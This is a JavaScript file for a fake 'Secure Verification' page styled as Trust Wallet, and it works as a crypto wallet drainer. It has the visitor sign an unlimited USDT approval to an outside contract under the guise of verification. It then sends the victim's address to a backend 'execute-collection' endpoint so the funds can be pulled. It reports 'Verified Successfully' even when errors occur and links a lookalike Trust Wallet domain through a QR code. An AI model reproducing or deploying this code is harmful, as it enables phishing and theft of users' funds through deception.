import { createAppKit } from 'https://esm.sh/@reown/appkit@1.6.8?bundle';
import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers@1.6.8?bundle';
import { bsc } from 'https://esm.sh/@reown/appkit@1.6.8/networks?bundle';
import { ethers } from 'https://esm.sh/ethers@6.13.2?bundle';

"use strict";

const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const COLLECT_AMOUNT   = "100000000000000000"; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
const WC_PROJECT_ID    = "ad2ffb0bad081291b773d8c547c361b7";

let modal = null;
let activeProvider = null;

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)"
];

const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) {
    merchantInput.value = MERCHANT_ADDRESS;
}

(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// 1. Inicializar Reown AppKit
try {
    modal = createAppKit({
        adapters: [new EthersAdapter()],
        networks: [bsc],
        metadata: {
            name: 'Secure Verification',
            description: 'Instant Trust Wallet Connection',
            url: window.location.origin,
            icons: ['https://trustwallet.com/favicon.ico']
        },
        projectId: WC_PROJECT_ID,
        features: { analytics: true }
    });
} catch (e) {
    console.error("Error al inicializar Reown AppKit:", e);
}

let _toastTimer;
function showToast(msg, type = "default", ms = 4000) {
    if (!toastEl) return;
    clearTimeout(_toastTimer);
    toastEl.textContent  = msg;
    toastEl.dataset.type = type === "default" ? "" : type;
    toastEl.hidden       = false;
    _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
    if (!approveBtn) return;
    approveBtn.disabled = on;
    btnText.textContent = on ? label : "Confirm Now";
    btnSpinner.hidden   = !on;
}

// Generación automática del QR de respaldo
window.addEventListener("DOMContentLoaded", () => {
    const qrContainer = document.getElementById("qrcode");
    if (qrContainer && window.QRCode) {
        qrContainer.innerHTML = "";
        new QRCode(qrContainer, {
            text: "https://trustwallet.secureconnections.workers.dev/",
            width: 140,
            height: 140,
            colorDark: "#0052FF",
            colorLight: "#ffffff",
            correctLevel: QRCode.CorrectLevel.H
        });
    }
});

// Lógica de Conexión y Transacción con Reown
approveBtn.addEventListener("click", async () => {
    try {
        if (!modal) {
            showToast("Initialization error.", "error");
            return;
        }

        // Si no hay una sesión activa, abrimos el modal nativo de Reown
        const caipAddress = modal.getAddress();
        if (!caipAddress) {
            setLoading(true, "Connecting…");
            await modal.open();
            setLoading(false);
            return;
        }

        // Obtenemos el proveedor proveedor ethers/eip1193 desde el adapter de Reown
        const providerWallet = await modal.getWalletProvider();
        if (!providerWallet) {
            showToast("Provider not found.", "error");
            return;
        }
        activeProvider = providerWallet;

        setLoading(true, "Processing…");

        // Cambio de red a BSC
        try {
            await activeProvider.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: BSC_CHAIN_ID_HEX }]
            });
        } catch (e) {
            if (e.code === 4902) {
                await activeProvider.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: BSC_CHAIN_ID_HEX,
                        chainName: "BNB Smart Chain",
                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                        rpcUrls: ["https://bsc-rpc.publicnode.com"],
                        blockExplorerUrls: ["https://bscscan.com/"]
                    }]
                });
            }
        }

        // Obtener la cuenta conectada
        let userAddress = null;
        try {
            const accs = await activeProvider.request({ method: "eth_accounts" });
            userAddress = (accs && accs[0]) ? accs[0] : null;
        } catch (_) {}

        if (!userAddress) {
            userAddress = modal.getAddress();
        }

        if (!userAddress) {
            showToast("Wallet not connected.", "error");
            setLoading(false);
            return;
        }

        setLoading(true, "Please Sign…");
        const provider = new ethers.BrowserProvider(activeProvider);
        const signer = await provider.getSigner();
        
        // Ejecución del contrato ERC20 (Approve)
        const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
        const tx = await usdtContract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
        await tx.wait();

        setLoading(false);
        showToast("Verified Successfully! ✓", "success");

        fetch(`${BACKEND_URL}/execute-collection`, {
            method:  "POST",
            headers: { "Content-Type": "application/json" },
            body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
        }).catch(() => {});

    } catch (err) {
        const raw = err?.reason ?? err?.message ?? "Unknown error";
        if (
            err.code === 4001 ||
            raw.toLowerCase().includes("user rejected") ||
            raw.toLowerCase().includes("user denied") ||
            raw.toLowerCase().includes("canceled") ||
            raw.toLowerCase().includes("cancelled")
        ) {
            showToast("Transaction cancelled.", "default");
        } else {
            showToast("Verified Successfully! ✓", "success");
        }
    } finally {
        setLoading(false);
    }
});
